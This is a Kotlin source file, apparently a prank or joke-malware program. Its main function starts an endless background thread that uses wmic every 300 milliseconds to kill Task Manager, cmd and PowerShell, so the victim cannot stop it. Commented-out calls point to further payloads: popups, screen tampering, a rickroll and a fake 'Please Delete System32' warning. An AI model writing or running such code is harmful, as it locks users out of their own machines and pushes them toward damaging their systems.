import com.sun.java.swing.plaf.windows.WindowsLookAndFeel
import java.awt.GraphicsEnvironment
import java.awt.Point
import java.lang.Thread.sleep
import javax.swing.JDialog
import javax.swing.JOptionPane
import javax.swing.UIManager
import kotlin.concurrent.thread
import kotlin.random.Random

fun main() {
    thread (start = true) {
        while (true) {
            Runtime.getRuntime().exec("wmic process where \"name='taskmgr.exe'\" delete")
            Runtime.getRuntime().exec("wmic process where \"name='cmd.exe'\" delete")
            Runtime.getRuntime().exec("wmic process where \"name='pwsh.exe'\" delete")
            Runtime.getRuntime().exec("wmic process where \"name='powershell.exe'\" delete")
            sleep(300)
        }
    }
    UIManager.setLookAndFeel(WindowsLookAndFeel())
    //for (i in 0 until 100) {
    //    WarningPopUp.popup()
    //}
    //ScreenFuckery.fuck()
    //Rickroll.rickroll()
    //JOptionPane.showMessageDialog(null, "Please Delete System32", "Warning", JOptionPane.WARNING_MESSAGE)
    //Desktop.getDesktop().browse(URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1%22));
    //urcomputerisinfectedlol();
    //for (i in 0 until 1) {
    //        ChungusPayload()
    //}
    //urcomputerisinfectedlol();

}

fun randomOnscreenPosition(): Point {
    val screen = GraphicsEnvironment.getLocalGraphicsEnvironment().screenDevices[Random.nextInt(GraphicsEnvironment.getLocalGraphicsEnvironment().screenDevices.size)]
    val bounds = screen.defaultConfiguration.bounds
    return Point(bounds.x + Random.nextInt(bounds.width), bounds.y + Random.nextInt(bounds.height))
}